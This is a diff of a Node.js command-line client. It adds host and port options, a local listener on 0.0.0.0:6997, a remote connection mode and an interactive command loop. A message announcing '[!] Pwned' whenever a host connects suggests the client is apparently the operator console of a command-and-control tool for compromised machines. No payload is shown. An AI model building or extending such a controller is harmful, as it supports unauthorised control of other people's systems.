@@ -1,52 +1,80 @@
-const net = require('net');
 const yargs = require('yargs');
-const { loadPacketTypes } = require('../protocol/protocol');
+const { loadPacketTypes } = require('../common/protocol');
 const registry = require('./registry');
 const { readline, parseArgs } = require('./readline');
-const Server = require('./server');
-
-const SRV_HOST = '127.0.0.1';
-const SRV_PORT = 35768;
+const { ControlConnection } = require('./controlconnection');
+const { ControlLocal } = require('./controllocal');
 
 async function main() {
-    //let argv = yargs(process.argv.slice(2)).argv;
+    let argv = yargs(process.argv.slice(2))
+        .usage('Usage: $0 [-h ip] [-p port]')
+        .option('host')
+        .string('host')
+        .alias('host', 'h')
+        .default('port', 35768)
+        .number('port')
+        .alias('port', 'p')
+        .help('help').argv;
+
     await loadPacketTypes();
     await registry.loadCommands();
 
-    let sock = net.connect(SRV_PORT, SRV_HOST);
-    sock.on('connect', async () => {
-        console.log(`Connected to ${sock.remoteAddress}:${sock.remotePort}`);
-
-        server = new Server(sock);
-        process.on('SIGINT', () => {
-            server.abortCurrentCommand();
+    let local = argv.host === undefined;
+    let control = null;
+    if (local) {
+        control = new ControlLocal('0.0.0.0', 6997);
+        await new Promise((resolve) => {
+            control.on('listening', resolve);
         });
+        console.log(`Local control server started at 0.0.0.0:6997`);
+    } else {
+        control = new ControlConnection(argv.host, argv.port);
+        try {
+            await new Promise((resolve, reject) => {
+                control.on('connect', resolve);
+                control.on('error', reject);
+                control.on('timeout', reject);
+            });
+            control.on('error', (err) => {
+                console.error(`ERROR: Error occurred with remote server (${err})`);
+            });
+            control.on('close', () => {
+                console.error('Server connection closed.');
+                process.exit(0);
+            });
+            console.log(
+                `Connected to ${control.ip}:${control.connection.socket().remotePort}`
+            );
+        } catch (err) {
+            console.error(`ERROR: could not connect to server (${err})`);
+            process.exit(1);
+        }
+    }
 
-        if (process.stdin.isTTY) {
-            while (true) {
-                process.stdout.write('> ');
-                let line = await readline();
-                if (line == '') {
-                    continue;
-                }
-                let args = parseArgs(line);
-                if (!(args[0] in registry.commands)) {
-                    console.log('Unknown command.');
-                } else {
-                    await registry.commands[args[0]](server, args);
-                }
+    control.on('connection', (host) => {
+        console.log(`\n[!] Pwned ${host.ip}`);
+    });
+
+    process.on('SIGINT', () => {
+        control.abortCurrentCommand();
+    });
+
+    if (process.stdin.isTTY) {
+        while (true) {
+            process.stdout.write('> ');
+            let line = await readline();
+            if (line == '') {
+                continue;
+            }
+            let args = parseArgs(line);
+            if (!(args[0] in registry.commands)) {
+                console.log('Unknown command.');
+            } else {
+                await registry.commands[args[0]](control, args);
             }
         }
-    });
-
-    sock.on('error', (err) => {
-        console.error(`ERROR: could not connect to host: ${err}`);
-        process.exit(1);
-    });
-
-    sock.on('timeout', () => {
-        console.log('Connection timed out');
-    });
+    }
+    process.exit(0);
 }
 
 main();
